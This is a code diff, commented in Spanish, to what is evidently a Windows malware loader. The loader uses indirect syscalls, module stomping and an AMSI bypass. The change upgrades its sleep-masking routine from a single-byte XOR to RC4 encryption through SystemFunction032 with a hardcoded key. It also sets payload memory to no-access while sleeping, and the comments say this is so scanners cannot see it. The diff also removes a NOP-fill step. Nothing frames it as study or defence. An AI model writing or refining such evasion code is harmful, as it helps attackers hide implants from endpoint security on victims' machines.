@@ -21,6 +21,12 @@ typedef struct _STOMP_CONTEXT {
     PVOID OriginalText;
 } STOMP_CONTEXT, *PSTOMP_CONTEXT;
 
+typedef struct {
+    DWORD Length;
+    DWORD MaximumLength;
+    PVOID Buffer;
+} USTRING;
+
 typedef struct _API_TABLE {
     SYSCALL_ENTRY NtAllocateVirtualMemory;
     SYSCALL_ENTRY NtProtectVirtualMemory;
@@ -31,6 +37,7 @@ typedef struct _API_TABLE {
     SYSCALL_ENTRY NtWaitForSingleObject;
     ULONG_PTR CreateWaitableTimerW;
     ULONG_PTR SetWaitableTimer;
+    ULONG_PTR SystemFunction032;
 } API_TABLE;
 
 // Declaraciones globales compartidas
@@ -93,7 +100,6 @@ static BOOL ModuleStompRobust(LPCWSTR targetDll, SIZE_T payloadSize, PSTOMP_CONT
     SIZE_T regionSize = ctx->RegionSize;
     
     InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pText, &regionSize, PAGE_READWRITE, &oldProtect);
-    memset(pText, 0x90, ctx->RegionSize); 
     
     return TRUE;
 }
@@ -147,32 +153,36 @@ static BOOL BypassAMSI_DataOnlyRobust() {
 static void ActiveSleepMask(DWORD dwMs, PVOID pAddress, SIZE_T sSize) {
     HANDLE hTimer = NULL;
     LARGE_INTEGER li;
-    li.QuadPart = -(int64_t)dwMs * 10000; // MS a unidades de 100ns
+    li.QuadPart = -(int64_t)dwMs * 10000; 
 
     typedef HANDLE (WINAPI *CreateWaitableTimerW_t)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR);
     typedef BOOL (WINAPI *SetWaitableTimer_t)(HANDLE, const LARGE_INTEGER*, LONG, PTIMERAPCROUTINE, LPVOID, BOOL);
+    typedef NTSTATUS (WINAPI *SystemFunction032_t)(USTRING*, USTRING*);
 
     CreateWaitableTimerW_t pCreateWaitableTimerW = (CreateWaitableTimerW_t)g_ApiTable.CreateWaitableTimerW;
     SetWaitableTimer_t pSetWaitableTimer = (SetWaitableTimer_t)g_ApiTable.SetWaitableTimer;
+    SystemFunction032_t pSystemFunction032 = (SystemFunction032_t)g_ApiTable.SystemFunction032;
 
     hTimer = pCreateWaitableTimerW(NULL, TRUE, NULL);
     if (hTimer) {
         if (pSetWaitableTimer(hTimer, &li, 0, NULL, NULL, FALSE)) {
             ULONG old;
+            USTRING data = { (DWORD)sSize, (DWORD)sSize, pAddress };
+            USTRING key = { 16, 16, (PVOID)"\x13\x37\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE\x01\x23\x45\x67\x89\xAB" };
             
-            // 1. Cifrar la sección de memoria del payload
+            // 1. Cifrado RC4 (SystemFunction032)
             InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pAddress, &sSize, PAGE_READWRITE, &old);
-            for (SIZE_T i = 0; i < sSize; i++) ((PBYTE)pAddress)[i] ^= 0x69;
+            pSystemFunction032(&data, &key);
             
-            // 2. Cambiar permisos a NOACCESS para que los escáneres no lo vean
+            // 2. Enmascaramiento de permisos
             InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pAddress, &sSize, PAGE_NOACCESS, &old);
 
-            // 3. Esperar al temporizador (evade ganchos de Sleep)
+            // 3. Espera nativa
             InvokeSyscall(g_ApiTable.NtWaitForSingleObject.ssn, g_SyscallGadget, hTimer, FALSE, NULL);
 
-            // 4. Restaurar y descifrar
+            // 4. Restauración y descifrado
             InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pAddress, &sSize, PAGE_READWRITE, &old);
-            for (SIZE_T i = 0; i < sSize; i++) ((PBYTE)pAddress)[i] ^= 0x69;
+            pSystemFunction032(&data, &key);
             InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pAddress, &sSize, PAGE_EXECUTE_READ, &old);
         }
         CloseHandle(hTimer);
